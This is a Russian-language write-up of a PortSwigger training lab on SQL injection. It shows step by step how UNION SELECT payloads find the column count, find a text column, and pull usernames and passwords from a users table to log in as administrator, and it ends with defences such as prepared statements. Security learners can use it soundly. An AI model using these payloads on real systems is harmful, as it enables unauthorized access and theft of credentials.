# 📘 PortSwigger Lab: SQL injection UNION attack, retrieving data from other tables

<a id="top"></a>

> 🔗 Лаба: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables

---

# 📑 Оглавление

- [🎯 Цель](#goal)
- [🧠 Идея атаки](#idea)
- [🏗 Что уже известно](#how)
- [🔍 Шаг 1 — Определение количества колонок](#step1)
- [🔍 Шаг 2 — Поиск string column](#step2)
- [🔍 Шаг 3 — Получение данных из users](#step3)
- [🔍 Шаг 4 — Вход как administrator](#step4)
- [💥 Почему атака сработала](#why)
- [🛡 Защита](#defense)
- [🛠 Чеклист](#checklist)

---

<a id="goal"></a>

# 🎯 Цель

Получить usernames и passwords из таблицы `users` и войти как `administrator`.

---

<a id="idea"></a>

# 🧠 Идея атаки

`UNION SELECT` позволяет добавлять собственный SELECT-запрос к оригинальному SQL.

Это позволяет читать данные из других таблиц базы данных.

---

<a id="how"></a>

# 🏗 Что уже известно

Лаба уже сообщает:

```text
table = users
columns = username,password
```

Нужно:
1. определить количество колонок;
2. найти string-compatible column;
3. вывести usernames/passwords.

---

<a id="step1"></a>

# 🔍 Шаг 1 — Определение количества колонок

```sql
UNION SELECT NULL--
```

❌ Error

```sql
UNION SELECT NULL,NULL--
```

✅ Success

---

# Вывод

Оригинальный SELECT содержит:
# 2 колонки

---

<a id="step2"></a>

# 🔍 Шаг 2 — Поиск string column

```http
/filter?category=Accessories' UNION SELECT 'test',NULL--
```

или:

```http
/filter?category=Accessories' UNION SELECT NULL,'test'--
```

---

# Что ищем

Момент,
когда:
- строка появляется на странице;
- response = 200 OK.

---

# Результат

Колонки принимают string values,
поэтому можно выводить usernames/passwords.

---

<a id="step3"></a>

# 🔍 Шаг 3 — Получение данных из users

Финальный payload:

```http
/filter?category=Accessories' UNION SELECT username,password FROM users--
```

---

# Как выглядит SQL

```sql
SELECT name,description FROM products
WHERE category='Accessories'
UNION SELECT username,password FROM users--'
```

---

# Что произошло

Приложение показало:

```text
administrator
password123
```

и другие credentials пользователей.

---

<a id="step4"></a>

# 🔍 Шаг 4 — Вход как administrator

Открываем:

```text
/login
```

Используем:
- username = administrator
- password = найденный password

---

# Результат

Успешный вход в аккаунт administrator.

Лаба была решена.

---

<a id="why"></a>

# 💥 Почему атака сработала

Потому что приложение:
- вставляло input напрямую в SQL;
- не использовало prepared statements;
- отображало SQL results пользователю.

---

<a id="defense"></a>

# 🛡 Защита

- Prepared Statements
- Parameterized Queries
- Input Validation
- Least Privilege
- WAF

Безопасный пример:

```php
$stmt = $pdo->prepare("SELECT * FROM products WHERE category=?");
```

---

<a id="checklist"></a>

# 🛠 Чеклист

- [ ] найден SQL Injection
- [ ] найдено количество колонок
- [ ] найден string-compatible column
- [ ] получены usernames/passwords
- [ ] выполнен login как administrator

---

# ⬆ Наверх

[Вернуться к началу](#top)
